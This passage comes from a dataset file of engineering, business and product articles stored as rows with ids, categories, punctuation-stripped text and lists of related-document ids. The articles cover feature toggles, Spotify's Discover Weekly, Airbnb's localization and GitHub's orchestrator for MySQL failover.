cohorts   groups of users who consistently experience a feature as always being On or Off  A cohort of canary users is created via a random sampling of 1  of the user base   perhaps using a modulo of user ID  This canary cohort will consistently have the feature turned on  while the other 99  of the user base remain using the old algorithm  Key business metrics  user engagement  total revenue earned  etc  are monitored for both groups to gain confidence that the new algorithm does not negatively impact user behavior  Once the team are confident that the new feature has no ill effects they modify their Toggle Configuration to turn it on for the entire user base   A B testing The team s product manager learns about this approach and is quite excited  She suggests that the team use a similar mechanism to perform some A B testing  There s been a long running debate as to whether modifying the crime rate algorithm to take pollution levels into account would increase or decrease the game s playability  They now have the ability to settle the debate using data  They plan to roll out a cheap implementation which captures the essence of the idea  controlled with a Feature Toggle  They will turn the feature on for a reasonably large cohort of users  then study how those users behave compared to a  control  cohort  This approach will allow the team to resolve contentious product debates based on data  rather than HiPPOs   This brief scenario is intended to illustrate both the basic concept of Feature Toggling but also to highlight how many different applications this core capability can have  Now that we ve seen some examples of those applications let s dig a little deeper  We ll explore different categories of toggles and see what makes them different  We ll cover how to write maintainable toggle code  and finally share practices to avoid some of pitfalls of a feature toggled system,"[99 61 314 520 1351 884 778 1225 300 588 895]"
104,training-dataset/engineering/627.txt,engineering,Trends in   and the Future of   Infrastructure   Andreessen Horowitzwatch time  23 minutes   Infrastructure is dead   some say  thanks to cloud computing   and a couple large incumbents sucking out all the profits in this space  Er  not really  We re actually entering a renaissance of sorts   a  golden era of infrastructure    and it s one that is biased towards startups  They re the ones who have the unfair advantage  argues a16z general partner  and former Nicira co founder CTO  Martin Casado in this talk   One of the fathers of software defined networking  SDN   Casado shares what happens when you put a  software defined  in front of everything  No silo is safe  And it s not just storage  it s computing  networking  security  management  databases  analytics  development  and so on   So how are enterprise applications evolving  Is it really similar to what happened with consumer tools  And what will it take for startups to truly take on incumbents in this space  In this talk  previously delivered at other industry events  Casado shares his thoughts on the future of infrastructure as well as views on how 3 important trends coming together  hardware to software  software to services  and finally  the rise of the developer,"[104 1373 1217 695 830 87 1042 596 1192 61 92]"
112,training-dataset/engineering/970.txt,engineering,GOTO 2016   From Monolith to Microservices at Zalando   Rodrigue SchaeferPublished on Aug 8  2016  This presentation was recorded at GOTO Stockholm 2016  http   gotosthlm com    Rodrigue Schaefer   Head of Engineering at Zalando    ABSTRACT  In this talk  Head of Engineering Rodrigue Schaefer will discuss some of the challenges of Zalando s transition from monolith to microservices and how the company s engineering team has tackled them through a combination of organizational          Download slides and read the full abstract here   https   gotosthlm com 2016 sessions 7    https   twitter com gotosthlm  https   www facebook com GOTOConference  http   gotocon com,"[112 134 60 1138 773 1216 1159 234 988 1126 695]"
134,training-dataset/business/814.txt,business,Startup Funding Explained  Everything You Need to KnowPublished on Jun 2  2016  The Rest Of Us on Patreon   https   www patreon com TheRestOfUs    The Rest Of Us on Twitter   http   twitter com TROUchannel    The Rest Of Us T Shirts and More   http   teespring com TheRestOfUsClothing    Part 2   https   www youtube com watch v fcjmV       Credits   Music by The FatRat   https   www youtube com channel UCa_U     If you re a YouTuber  definitely check The FatRat  The channel offers a wide variety of free to use music for your videos,"[134 1138 112 1216 60 988 582 540 143 661 90]"
143,training-dataset/product/1435.txt,product,The magic that makes Spotify s Discover Weekly playlists so damn good   QuartzThis morning  just like every Monday morning  75 million Spotify users received a great new mixtape  30 songs that feel like a gift from a music loving friend  who might once have made a cassette tape with your name scrawled across the front   But these playlists  from Spotify s Discover Weekly service  were cooked up by an algorithm   Automated music recommendations are hardly new  but Spotify seems to have identified the ingredients of a personalized playlist that feel fresh and familiar at the same time  That s potentially a big advantage over competitors like Pandora  Google  and Apple  which largely have the same bottomless catalog of music but take very different approaches to picking the best songs for each user   It s scary how well  Spotify Discover Weekly playlists know me  Like former lover who lived through a near death experience with me well    Dave Horwitz   Dave_Horwitz  October 27  2015  Users seem to love Discover Weekly  Since the service quietly launched in June  songs from its playlists have been streamed 1 7 billion times  according to the company  When a technical hiccup delayed the release of new tracks one Monday in September  many were distraught    We now have more technology than ever before to ensure that if you re the smallest  strangest musician in the world  doing something that only 20 people in the world will dig  we can now find those 20 people and connect the dots between the artist and listeners   Matthew Ogle  who oversees the service at Spotify  told me recently   Discovery Weekly is just a really compelling new way to do that at a scale that s never been done before    The quality of Discover Weekly s picks is so consistently good  it s a bit uncanny  After I received several excellent playlists in a row  I couldn t stop thinking about how Spotify had figured me out  along with 75 million other people  Answering that question led me down the rabbit hole of how the system works in the first place and how an algorithm can delve into the deeply subjective realm of music to predict the songs that will make my pulse race and my head nod   If you re a Spotify user  you can see what songs Spotify has picked for you this week by logging in here when you come back to this page  your playlist will appear below   If you don t have Spotify  or haven t logged in  you ll see my most recent playlist    Understanding how the process works will give you a peek into how music fans will be discovering new music in the future  long after the idea of an actual mixtape has faded into the past   I ve also compiled a list of pro tips for existing Discover Weekly users  which you can find at the end    It s based on other people s playlists   The main ingredient in Discover Weekly  it turns out  is other people  Spotify begins by looking at the 2 billion or so playlists created by its users each one a reflection of some music fan s tastes and sensibilities  Those human selections and groupings of songs form the core of Discover Weekly s recommendations    Playlists are the common currency on Spotify  More users knew how to use them and create them than any other feature   said Ogle  who previously founded This Is My Jam  a startup that asked users to pick one favorite song at a time  It shut down earlier this year   Spotify considers everything from professionally curated playlists like RapCaviar to your cousin Joe s summer barbecue jams  It gives extra weight to the company s own playlists and those with more followers  Then it attempts to fill in the blanks between your listening habits and those with similar tastes  In the simplest terms  if Spotify notices that two of your favorite songs tend to appear on playlists along with a third song you haven t heard before  it will suggest the new song to you    and your own taste profile  But the recipe for your Discover Weekly playlist is a lot more complicated than that  Spotify also creates a profile of each user s individualized taste in music  grouped into clusters of artists and micro genres not just  rock  and  rap  but fine grained distinctions like  synthpop  and  southern soul   These are derived using technology from Echo Nest  a music analytics firm that Spotify acquired in 2014  which learns about emerging genres by having machines read music sites and analyze how various artists are described   I asked Spotify to show me what my own taste profile looks like  I have no idea what  chamber pop  or some of the other genres might be  by the way  but according to my Spotify listening data  I m a big fan   Algorithms bring it all together  The connection between data from 2 billion playlists and your personal taste profile is made by Spotify s algorithms  This is the secret sauce  and it gets complicated quickly   Spotify engineers shared many of the technical details in a presentation earlier this year  Their approaches include collaborative filtering  most commonly seen in Amazon s  customers who bought this item also bought   feature  and natural language processing  which is how Echo Nest understands music blogs and the titles of playlists  The company uses the open source software Kafka to manage the data in real time   But you don t need to understand any of that  This is how Ogle described the process to me in layman s terms    On one side  we ve built a model of all the music we know about  that is powered by all the curatorial actions of people on Spotify adding to playlists  On the other side  we have our impression of what your music taste is  Every Monday morning  we take these two things  do a little magic filtering  and try to find things that other users have been playlisting around the music you ve been jamming on  but that we think are either brand new to you or relatively new    Finding music to jam on  Spotify is also using deep learning a technique for recognizing patterns in enormous amounts of data  with powerful computers that are  trained  by humans to improve its Discover Weekly picks  That builds on work by Sander Dieleman  once a Spotify intern and now a research scientist for Google s AI subsidiary  DeepMind    We ve been experimenting with different approaches with deep learning and neural nets  and it is one of the most important features for what generates Discover Weekly   said Edward Newett  the lead engineer for Discover Weekly   On a recent Monday  this is what Spotify thought I might in a phrase Spotify employees are especially fond if be likely to jam on   You ll notice that there s an artist named Susie Tallman way out there on an island by herself in the lower right  She sings children s songs  and I have a toddler who likes to hear  Wheels on the Bus  over and over again  The system is smart enough to know that it should exclude those songs because Tallman is an outlier   Personalization can be a little strange  The results  as many Spotify Discover users can attest  are a little unearthly   How the hell did they come up with that   one friend exclaimed to me after a deep cut from the  90s alt rock band Dinosaur Jr  landed on his playlist    One of my favorite things is how weird Discover Weekly is   Ogle said   We can build this huge system  and it s taking millions of preferences and crunching them  and instead of music beige coming out  it s throwing out a lot of left field stuff    My playlists vary from week to week  presumably reflecting my shifting musical preferences  On a typical Discover Weekly playlist with 30 songs  I ll find about 15 songs I love  10 that are meh  four that I could do without  and one that I become totally obsessed with   One day recently in my favorite cafe  the soundtrack coming over the speakers sounded awfully familiar  Many of the tracks were on the mixtape that Spotify s algorithms had made just for me   But these were coming from someone else s Discover Weekly playlist  Homero  who works as a barista when he s not playing in his own band  had been given a nearly identical mixtape that week    You thought you were alone in the universe until you realize there s a guy just like you  musically at least    How did Homero and I get the same songs  Did two billion playlists filtered through a complex algorithm really churn out identical results for the two of us  Are Spotify s human editors putting their finger on the scale and promoting certain songs    Some people have said   Oh  all three of us had this track on our Discover Weekly  did someone put it there    Ogle told me   And the answer is yes  someone put it there  other Spotify users who were playlisting  which means that something is happening in music culture  in the world    He said Spotify never intentionally seeds the playlists with particular songs  despite repeated requests from artists and their labels    The answer to the labels is  have your artists release some awesome music  and get genuine music fans to share it  and it will end up in Discover Weekly   Ogle said   There are a lot of ways to say  hey  here s some music you should check out on Spotify  we think DW should remain firewalled from that sort of thing    Taking a trip into someone else s head  It gets even weirder when you listen to someone else s Discover Weekly playlist  as I encountered that day in the cafe  or in the weeks since when I have cajoled other Spotify users into sharing their playlists with me  It feels a bit like taking a momentary trip both the geographic and psychedelic kind into someone else s head  There s a strange feeling of unease that comes with listening to a mix that is optimized for someone else s subjective tastes and unconscious preferences    When I was young it was a very independent thing  you go home  throw on your CD collection  and that helped identify who you were  I am this type of music   Newett  the engineer  told me   But now you may realize  you thought you were alone in the universe until you realize there s a guy just like you  musically at least    The moment that Ogle realized that Discover Weekly was going to work was during a very early internal beta  when his team was testing on the recommendation engine with themselves as guinea pigs    Whatever just served this song needs to be out in the world     It was the first or second playlist Ed made for me  and the first track was by Jan Hammer  he s famous for writing the Miami Vice theme   he says  The song was  Don t You Know   from an album first released in 1977    It s hilariously smooth  I realized that all of Air was basically them ripping off this one song   Ogle says   It starts off with this poppy thing  then the strings when the vocals came in  I thought  holy shit  we have to ship this feature  Something snapped  and I thought whatever just served this song needs to be out in the world    Pro tips for using Discover Weekly  As good as Spotify s picks can be  they re not perfect my playlists usually contain one or two songs that I absolutely love   Tiger Phone Card  by Dengue Fever   Lady You Shot Me  by Har Mar Superstar   a half dozen that I like a lot   1960 What   by Gregory Porter   and a few stinkers  why do I keep getting so many Neil Diamond songs     I asked asked Ogle and Newett how users can fine tune their results and get the most out of Discovery Weekly  Their suggestions  along with a few tips from other heavy Spotify users  range from the very simple to the very nerdy   Add songs you like to a playlist or your Spotify library   If you save a song to a playlist or your library and then start jamming on it on a regular basis  it will really influence what we understand about you   Ogle said   Skip the songs you don t like  If users fast forward within the first 30 seconds of a song  the Discover Weekly algorithm interprets that as a  thumbs down  for that particular song and artist   Go down the rabbit hole on new artists and genres   If we recommend you something and you click through to the artist and start exploring their discography  it will pick up on that as well   Ogle said   The more exploration and streams you do outside DW  the more likely you are to influence what we pick for you    Be patient  The algorithm is designed to ignore sharp  temporary spikes in new listening activity because many people share their Spotify logins  so any new listening activity may not result in an immediate change to your playlist   We re safeguarding you from a friend using your account for a while   says Newett   Use  private mode  if you don t want Spotify to pay attention   Maybe your girlfriend is really into death metal   says Newett   We just ignore those  private mode  track plays   Spotify also ignores the songs you listen to within Discovery Weekly   We ve seen a lot of anxiety  like  if I only listen to Discovery Weekly  will the snake eat its own tail   says Newett   Some genres are mostly filtered out  Spotify does make some editorial decisions about what users are likely to want  so parents with young kids won t get a million songs from The Wiggles  Christmas songs will mostly disappear after Dec  25  and people who listen to rain forest soundtracks while they sleep don t have their playlists swamped with  Afternoon Thunderstorms Vol  2    For the most part we try to approach those as guardrails  rather than absolute  because people reserve the right to be human  and we try to respect that   Ogle said   Experiment with musical telepathy  Perhaps the best tip for getting more out of Spotify s recommendations is to listen to other people s Discovery Weekly playlists  Got a friend with great taste  Ask her to share a link to her playlist  They are private by default but can be shared by the user   Save your weekly playlists with IFTTT  One downside to Discover Weekly is that the playlist is wiped clean every Monday  You could save the songs into another playlist manually  or you can use the free IFTTT service to automatically save your weekly list into a separate archive playlist   Use Spotify s  Radio  feature  If you want to hear some new sounds and absolutely can t wait until Monday  right click on Discovery Weekly and select  Start Playlist Radio   The service will do its best to serve up an infinite list of songs in a similar vein to your weekly playlist   Playlist integration and graphics by Nikhil Sonnad,"[143 582 778 689 134 1373 1351 1086 61 1138 99]"
150,training-dataset/engineering/658.txt,engineering,Live Testing with Play Framework and EmberHere at LinkedIn  Ember js is one of the many frameworks we use to develop both internal and external facing web applications  It provides the power to create ambitious web applications while providing extensive testing capabilities to ensure the quality of the product   Making live testing efficient  One of the ways to ensure quality with our Ember applications is with live  or end to end  testing  It is a methodology used to test whether the flow of an application is performing as designed from start to finish  At LinkedIn  we test with real user scenarios  and our focus point is to verify that our ecosystem  app  API  and downstream services  and that the deployment are working as per business rules functionality defined for identified user flows  But as we know  live tests can be expensive due to the manual intervention involved  Also  they can take a long time to execute and can be flaky due to the many moving parts involved  partner deployments  inconsistency in API latency  UI changes  and more   So  our strategy has been to leverage a small set of live tests to achieve the above goals   There are multiple solutions that exists today to test web applications end to end  most commonly Selenium webdriver or casperJS  These solutions interact with the application similarly to how an end user would in a black box manner  But there are pitfalls with these solutions because their black box approach is prone to explicitly waiting for elements and not knowing when rendering is complete   This is where Ember js excels  because Ember s promise based actions will execute and continue only once all rendering or processing is complete and the promise is returned  Another reason for using Ember js for live testing is to have framework parity with what developers are already familiar with  Since our new approach toward development is to have developers write both app and test code  this allows them write tests with syntax they normally use  instead of having to switch between languages   With these positives points  we explored the possibilities of live testing with Ember js  The results are described below   Testing with Ember js  Before diving into the problems  let s briefly talk about how testing is done in Ember js   For more comprehensive details on Ember js  check out the official docs    Ember js tests are typically executed locally via testem  by spinning up an Express server that serves the Ember application and corresponding assets  A dev build containing the app  test code  and test support and the test page that serves the tests is built  Testem opens browsers pointing to the test page served by the express server  Tests execute  and a test complete hook is called and reporting is displayed   Live testing with Ember js  Using Ember s existing testing functionality to do live testing means that the test needs to live and be served along with the application  similar to how testem serves the app locally   When we deploy the Ember app  a production build will be packaged up and deployed  A production build only contains the minified version of all application assets  with no unnecessary dev dependencies or tests  So tests and test assets will need to be part of the deployed package   When testem serves the app and the test index html  the test index html is actually served as a static asset  This is because the application does not recognize a  test route  since it is not part of router js  Hence  we need a way to expose the test route  and have its access restricted only to LinkedIn test execution   Making live testing work with Ember  There were several hurdles to get over to enable live testing in Ember   Tests must not be served to production members  Tests must be available as part of the build  Tests must be executable against deployed server  Tests must only be executable by LinkedIn test execution runs   In early versions of ember cli  tests were built as part of the application js  So if we wanted to have tests deployed  we could not have tests served to the users  With the help of Trent Willis and the Ember community  changes were made so that ember cli builds a separate test js that contains all test code  This created a separation of app and test code to kickstart this experiment   Secondly  work was done during the build process so that the production build of our application also contains the test related support files  To do this  we added an in app add on to use the preprocessTree hook to return a tree with the necessary test assets to be part of the build  This excludes files that are unnecessary for app deployment  such as unit or acceptance tests  to keep test assets lightweight   Once the production build with tests was available  we updated the Play server that serves the Ember application so that it recognized a customized test route to serve the test index html  We also made sure to restrict access to this route to only LinkedIn test execution   The last step was to access this test page that is being served by our production servers  and have our test execution pipeline report back on the tests results  To do this  we used Casper js to bring up the test page in phantomjs and report back the test results once the tests were completed   Conclusion  With the work discussed above  live tests with Ember js were enabled  We were able to validate that our application was running fine from the user perspective during deployment as well as conduct periodic health checks  Tests are executed and reported within minutes  1 minute to check out the repo  2 minutes to execute casper script   with each test executing in seconds   Although there was additional work to be done for additional validation  better reporting  and executing on additional browsers  this was a good start and a good experiment to use Ember js for end to end testing,"[150 1029 1235 300 1252 298 550 1300 61 806 683]"
171,training-dataset/business/157.txt,business,How Airbnb Expanded To 190 Countries By Thinking  Glocal Airbnb may be the most global among Silicon Valley s mega unicorns   With homes and bedrooms available in 34 000 cities and 190 countries  Airbnb operates in more than double the number of territories as does ride share giant Uber  And unlike Snapchat or Pinterest  which have grown mostly within the United States  the  25 billion home sharing service now sees two thirds of its trips booked across country borders  Europe is actually Airbnb s largest market  But a truly international startup presents it s own problems   Airbnb s VP of Product  Joe Zadeh  describes it with a questionable portmanteau  the  glocal  challenge   We have to simultaneously build global and local  because for Airbnb to work we have to be everywhere   he tells FORBES   The fundamental tension that Airbnb has to solve is bridging this global local gap  On one hand  there are certain parts of the travel experience that must be applied in all places  like cleanliness standards  Everybody wants freshly laundered sheets  On the other hand  so much of what makes Airbnb stand out from the millions of cookie cutter hotel rooms you can stay in is the uniqueness of the local experience   For example  translation becomes a delicate balance  If you re traveling to Japan from the U S   you probably want to read home listings in English  But if Airbnb automatically translated Japanese profiles  visitors might expect that their host speaks English as well  The current solution  displaying profiles in the local language  and adding an optional translate button   Airbnb also has to customize its offerings based on the local payment options  With the Olympics coming to Rio this summer  Brazil is a key growth market for Airbnb  But last year the platform only supported U S  dollars as a payment method in the country  which covered just 22  of Brazilian payment volume  Since then  the company has added much more  national credit cards that can charge in Brazilian currency Real  as well as Boletos  a cash payment system run by local banks  and installment plans    Our top lesson was that data is very good but you have to go deeper to understand   Zadeh says   You might look at conversion rates in Brazil and they look fine  but the reality is there are so many people who are not using your service because they don t even get that far  They get to your homepage and see that you won t accept payments in their currency    The 30 million guests who booked accommodations through Airbnb in 2015 paid the company in 32 different currencies and then Airbnb paid out to hosts in a total of 65 currencies   Another focus for Airbnb  localized sign up methods  In the United States  Airbnb lets you sign up with an email address or a Facebook or Google account  But those aren t the best methods everywhere around the world  In China  for example  Airbnb now accepts log in credentials from users with Weibo or WeChat accounts  That change helped grow the company s customer base of Chinese travelers by 700  in 2015   It s still impossible for hosts to rent out rooms in China     If you get the right sign up methods  the sign up conversions can skyrocket overnight   Zadeh says   So we re not going to add every single sign up method  but when a place is an important destination for us or for people traveling from there  we will invest in trying to understand what s going on in that place    Airbnb is going to get a lot more local in the coming years  Last month  cofounder and CEO Brian Chesky announced an app redesign that added new elements like neighborhood reviews and recommendations for Airbnb users  It s all part of owning the entire travel experience  rather than just helping tourists rent a room    It s really good to understand what s global and what s not   Zadeh says   What of your product needs to change to work and what doesn t  Sometimes people even go too far to be local  You have to keep the global essentials pristine too    Brian Solomon covers technology and the on demand economy for Forbes  Follow him on Twitter  Facebook and LinkedIn,"[171 707 606 572 681 699 778 843 1086 1373 952]"
204,training-dataset/engineering/708.txt,engineering,Orchestrator at GitHubGitHub uses MySQL to store its metadata  Issues  Pull Requests  comments  organizations  notifications and so forth  While git repository data does not need MySQL to exist and persist  GitHub s service does  Authentication  API  and the website itself all require the availability of our MySQL fleet   Our replication topologies span multiple data centers and this poses a challenge not only for availability but also for manageability and operations   Automated failovers  We use a classic MySQL master replicas setup  where the master is the single writer  and replicas are mainly used for read traffic  We expect our MySQL fleet to be available for writes  Placing a review  creating a new repository  adding a collaborator  all require write access to our backend database  We require the master to be available   To that effect we employ automated master failovers  The time it would take a human to wake up   fix a failed master is beyond our expectancy of availability  and operating such a failover is sometimes non trivial  We expect master failures to be automatically detected and recovered within 30 seconds or less  and we expect failover to result with minimal loss of available hosts   We also expect to avoid false positives and false negatives  Failing over when there s no failure is wasteful and should be avoided  Not failing over when failover should take place means an outage  Flapping is unacceptable  And so there must be a reliable detection mechanism that makes the right choice and takes a predictable course of action   orchestrator  We employ Orchestrator to manage our MySQL failovers  orchestrator is an open source MySQL replication management and high availability solution  It observes MySQL replication topologies  auto detects topology layout and changes  understands replication rules across configurations and versions  detects failure scenarios and recovers from master and intermediate master failures   Failure detection  orchestrator takes a different approach to failure detection than the common monitoring tools  The common way to detect master failure is by observing the master  via ping  via simple port scan  via simple SELECT query  These tests all suffer from the same problem  What if there s an error   Network glitches can happen  the monitoring tool itself may be network partitioned  The naive solutions are along the lines of  try several times at fixed intervals  and on the n th successive failure  assume master is failed   While repeated polling works  they tend to lead to false positives and to increased outages  the smaller n is  or the smaller the interval is   the more potential there is for a false positive  short network glitches will cause for unjustified failovers  However larger n values  or longer poll intervals  will delay a true failure case   A better approach employs multiple observers  all of whom  or the majority of whom must agree that the master has failed  This reduces the danger of a single observer suffering from network partitioning   orchestrator uses a holistic approach  utilizing the replication cluster itself  The master is not an isolated entity  It has replicas  These replicas continuously poll the master for incoming changes  copy those changes and replay them  They have their own retry count interval setup  When orchestrator looks for a failure scenario  it looks at the master and at all of its replicas  It knows what replicas to expect because it continuously observes the topology  and has a clear picture of how it looked like the moment before failure   orchestrator seeks agreement between itself and the replicas  if orchestrator cannot reach the master  but all replicas are happily replicating and making progress  there is no failure scenario  But if the master is unreachable to orchestrator and all replicas say   Hey  Replication is broken  we cannot reach the master   our conclusion becomes very powerful  we haven t just gathered input from multiple hosts  We have identified that the replication cluster is broken de facto  The master may be alive  it may be dead  may be network partitioned  it does not matter  the cluster does not receive updates and for all practical purposes does not function  This situation is depicted in the image below   Masters are not the only subject of failure detection  orchestrator employs similar logic to intermediate masters  replicas which happen to have further replicas of their own   Furthermore  orchestrator also considers more complex cases as having unreachable replicas or other scenarios where decision making turns more fuzzy  In some such cases  it is still confident to proceed to failover  In others  it suffices with detection notification only   We observe that orchestrator  s detection algorithm is very accurate  We spent a few months in testing its decision making before switching on auto recovery   Failover  Once the decision to failover has been made  the next step is to choose where to failover to  That decision  too  is non trivial   In semi sync replication environments  which orchestrator supports  one or more designated replicas are guaranteed to be most up to date  This allows one to guarantee one or more servers that would be ideal to be promoted  Enabling semi sync is on our roadmap and we use asynchronous replication at this time  Some updates made to the master may never make it to any replicas  and there is no guarantee as for which replica will get the most recent updates  Choosing the most up to date replica means you lose the least data  However in the world of operations not all replicas are created equal  at any given time we may be experimenting with a recent MySQL release  that we re not ready yet to put to production  or may be transitioning from STATEMENT based replication to ROW based  or have servers in a remote data center that preferably wouldn t take writes  Or you may have a designated server of stronger hardware that you d like to promote no matter what   orchestrator understands all replication rules and picks a replica that makes most sense to promote based on a set of rules and the set of available servers  their configuration  their physical location and more  Depending on servers  configuration  it is able to do a two step promotion by first healing the topology in whatever setup is easiest  then promoting a designated or otherwise best server as master   We build trust in the failover procedure by continuously testing failovers  We intend to write more on this in a later post   Anti flapping and acknowledgements  Flapping is strictly unacceptable  To that effect orchestrator is configured to only perform one automated failover for any given cluster in a preconfigured time period  Once a failover takes place  the failed cluster is marked as  blocked  from further failovers  This mark is cleared after  say  30 minutes  or until a human says otherwise   To clarify  an automated master failover in the middle of the night does not mean stakeholders get to sleep it over  Pages will arrive  even as failover takes place  A human will observe the state  and may or may not acknowledge the failover as justified  Once acknowledged  orchestrator forgets about that failover and is free to proceed with further failovers on that cluster should the case arise   Topology management  There s more than failovers to orchestrator   It allows for simplified topology management and visualization   We have multiple clusters of differing size  that span multiple datacenters  DCs   Consider the following   The different colors indicate different data centers  and the above topology spans three DCs  Cross DC network has higher latency and network calls are more expensive than within the intra DC network  and so we typically group DC servers under a designated intermediate master  aka local DC master  and reduce cross DC network traffic  In the above instance 64bb  blue  2nd from bottom on the right  could replicate from instance 6b44  blue  bottom  middle  and free up some cross DC traffic   This design leads to more complex topologies  replication trees that go deeper than one or two levels  There are more use cases to having such topologies   Experimenting with a newer version  to test  say  MySQL 5 7 we create a subtree of 5 7 servers  with one acting as an intermediate master  This allows us to test 5 7 replication flow and speed   we create a subtree of servers  with one acting as an intermediate master  This allows us to test replication flow and speed  Migrating from STATEMENT based replication to ROW based replication  we again migrate slowly by creating subtrees  adding more and more nodes to those trees until they consume the entire topology   based replication to based replication  we again migrate slowly by creating subtrees  adding more and more nodes to those trees until they consume the entire topology  By way of simplifying automation  a newly provisioned host  or a host restored from backup  is set to replicate from the backup server whose data was used to restore the host   Data partitioning is achieved by incubating and splitting out new clusters  originally dangling as sub clusters then becoming independent   Deep nested replication topologies introduce management complexity   All intermediate masters turn to be point of failure for their nested subtrees   Recoveries in mixed versions topologies or mixed format topologies are subject to cross version or cross format replication constraints  Not any server can replicate from any other   Maintenance requires careful refactoring of the topology  you can t just take down a server to upgrade its hardware  if it serves as a local intermediate master taking it offline would break replication on its own replicas   orchestrator allows for easy and safe refactoring and management of such complex topologies   It can failover dead intermediate masters  eliminating the  point of failure  problem   Refactoring  moving replicas around the topology  is made easy via GTID or Pseudo GTID  an application level injection of sparse GTID like entries    orchestrator understands replication rules and will refuse to place  say  a 5 6 server below a 5 7 server   orchestrator also serves as the de facto topology state inventory indicator  It complements puppet or service discoveries configuration which imply desired state  by actually observing the existing state  State is queryable at various levels  and we employ orchestrator at some of our automation tasks   Chatops integration  We love our chatops as they make our operations visible and accessible to our greater group of engineers  While the orchestrator service provides a web interface  we rarely use it  one s browser is her own private command center  with no visibility to others and no history   We rely on chatops for most operations  As a quick example of visibility we get by chatops  let s examine a cluster   shlomi noach  orc cluster sample cluster Hubot host lag status version mode format extra                             instance e854 0s ok 5 6 26 74 0 log rw STATEMENT    P GTID   instance fadf 0s ok 5 6 26 74 0 log ro STATEMENT    P GTID   instance 9d3d 0s ok 5 6 31 77 0 log ro STATEMENT    P GTID   instance 8125 0s ok 5 6 31 77 0 log ro STATEMENT    P GTID   instance b982 0s ok 5 6 26 74 0 log ro STATEMENT    P GTID   instance c5a7 0s ok 5 6 31 77 0 log ro STATEMENT    P GTID   instance 64bb 0s ok 5 6 31 77 0 log rw nobinlog P GTID   instance 6b44 0s ok 5 6 31 77 0 log rw STATEMENT    P GTID   instance cac3 14400s ok 5 6 31 77 0 log rw STATEMENT    P GTID  Say we wanted to upgrade instance fadf to 5 6 31 77 0 log   It has two replicas attached  that I don t want to be affected  We can   shlomi noach  orc relocate replicas instance fadf below instance c5a7 Hubot instance 9d3d instance 8125  To the effect of   shlomi noach  orc cluster sample cluster Hubot host lag status version mode format extra                             instance e854 0s ok 5 6 26 74 0 log rw STATEMENT    P GTID   instance fadf 0s ok 5 6 26 74 0 log ro STATEMENT    P GTID   instance b982 0s ok 5 6 26 74 0 log ro STATEMENT    P GTID   instance c5a7 0s ok 5 6 31 77 0 log ro STATEMENT    P GTID   instance 9d3d 0s ok 5 6 31 77 0 log ro STATEMENT    P GTID   instance 8125 0s ok 5 6 31 77 0 log ro STATEMENT    P GTID   instance 64bb 0s ok 5 6 31 77 0 log rw nobinlog P GTID   instance 6b44 0s ok 5 6 31 77 0 log rw STATEMENT    P GTID   instance cac3 14400s ok 5 6 31 77 0 log rw STATEMENT    P GTID  The instance is now free to be taken out of the pool   Other actions are available to us via chatops  We can force a failover  acknowledge recoveries  query topology structure etc  orchestrator further communicates with us on chat  and notifies us in the event of a failure recovery   orchestrator also runs as a command line tool  and the orchestrator service supports web API  and so can easily participate in automated tasks   orchestrator   GitHub  GitHub has adopted orchestrator   and will continue to improve and maintain it  The github repo will serve as the new upstream and will accept issues and pull requests from the community   orchestrator continues to be free and open source  and is released under the Apache License 2 0   Migrating the project to the GitHub repo had the unfortunate result of diverging from the original Outbrain repo  due to the way import paths are coupled with repo URI in golang   The two diverged repositories will not be kept in sync  and we took the opportunity to make some further diverging changes  though made sure to keep API   command line spec compatible  We ll keep an eye for incoming Issues on the Outbrain repo   Outbrain  It is our pleasure to acknowledge Outbrain as the original author of orchestrator   The project originated at Outbrain while seeking to manage a growing fleet of servers in three data centers  It began as a means to visualize the existing topologies  with minimal support for refactoring  and came at a time where massive hardware upgrades and datacenter changes were taking place  orchestrator was used as the tool for refactoring and for ensuring topology setups went as planned and without interruption to service  even as servers were being provisioned or retired   Later on Pseudo GTID was introduced to overcome the problems of unreachable crashing lagging intermediate masters  and shortly afterwards recoveries came into being  orchestrator was put to production in very early stages and worked on busy and sensitive systems   Outbrain was happy to develop orchestrator as a public open source project and provided the resources to allow its development  not only to the specific benefits of the company  but also to the wider community  Outbrain authors many more open source projects  which can be found on their GitHub s Outbrain engineering page   We d like to thank Outbrain for their contributions to orchestrator   as well as for their openness to having us adopt the project   Further acknowledgements  orchestrator was later developed at Booking com  It was brought in to improve on the existing high availability scheme  orchestrator  s flexibility allowed for simpler hardware setup and faster failovers  It was fortunate to enjoy the large MySQL setup Booking com employs  managing various MySQL vendors  versions  configurations  running on clusters ranging from a single master to many hundreds of MySQL servers and Binlog Servers on multiple data centers  Booking com continuously contributes to orchestrator    We d like to further acknowledge major community contributions made by Google Vitess   orchestrator is the failover mechanism used by Vitess   and by Square  Inc   Related projects  We ve released a public Puppet module for orchestrator  authored by  tomkrouper  This module sets up the orchestrator service  config files  logging etc  We use this module within our own puppet setup  and actively maintain it   Chef users  please consider this Chef cookbook by  silviabotros,"[615 204 699 310 1162 1336 889 393 1351 946 1297]"
206,training-dataset/engineering/786.txt,engineering,The Art of a Pull RequestThere are a few questions that you need to answer before you open a Pull Request  In this article  we ll cover how to make sure you comply with the maintainer s guidelines  and how to get your changes merged  We ll take the perspective of both the maintainer and the contributor  but mostly discuss the contributor s vantage point   Something that we ve been discussing recently in Kibana   the open source analytics dashboard for Elasticsearch I outrageously call my day job   is how to improve the process of contributing changes  Kibana is an entirely open source product that is also a part of the Elastic Stack   which puts us in a unique position  Contributors work in the open  they chat on IRC  communicate in GitHub issues  work on their own public forks  and create Pull Requests  Core contributors are no different in this regard  and are subject to code reviews just like anyone else who s willing to submit a patch   Contributing Guidelines  Code review processes can be wildly different across open source projects  The best place to start is to look for a CONTRIBUTING file in the top level directory for the repository  Large open source projects usually have one of these  In it  maintainers lay out the rules for engagement when it comes to reporting issues  requesting features  asking for support  or contributing code to the repository   While reading through a CONTRIBUTING file might sound like a waste of time  it s actually going to save you time in the long run  If you start contributing code to a repository right away  without going through their guidelines  you may be wasting time away by not conforming to their conventions  If you file an issue with insufficient information  maintainers are going to have to ask for more details  point you to the CONTRIBUTING file so that you actually read it  and generally waste time  At the same time  you ll be wasting your own time by having to go in repeatedly and update bits of your bug report every time   Since these types of guidelines vary quite a bit from organization to organization   and sometimes even from repository to repository under the same organization   we ll focus on the contributing guidelines for Kibana as an example we can learn and extract conclusions from   The Kibana guidelines start with a table of contents  Right off the bat  you get a rough idea of what s covered   it would seem there are instructions on how to report issues  answers to common questions  and a detailed walkthrough explanation on how to contribute code to the Kibana repository   Kibana contributing guidelines  Good contributing guidelines contain helpful information such as how to set up the development environment  so that contributors don t have to figure things out on 